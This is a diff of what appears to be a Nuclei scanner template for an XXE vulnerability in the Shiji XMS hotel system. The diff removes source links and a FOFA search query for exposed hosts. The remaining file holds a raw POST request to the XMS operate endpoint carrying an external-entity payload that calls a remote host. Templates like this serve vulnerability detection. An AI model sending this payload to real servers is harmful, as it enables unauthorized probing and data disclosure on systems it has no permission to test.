@@ -3,20 +3,14 @@ info:
   name: 西软云XMS operate XXE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/weken42xvgqqnxk8'
+  description: ''
   tags: xxe,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: weken42xvgqqnxk8
-    fofa: app="shiji-西软云XMS"
 http:
 - raw:
   - 'POST /XopServerRS/rest/futurehotel/operate HTTP/1.1
 
 
     Content-Type: application/x-www-form-urlencoded
-
-
 
 
     <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://www.baidu.com"> %remote;]>
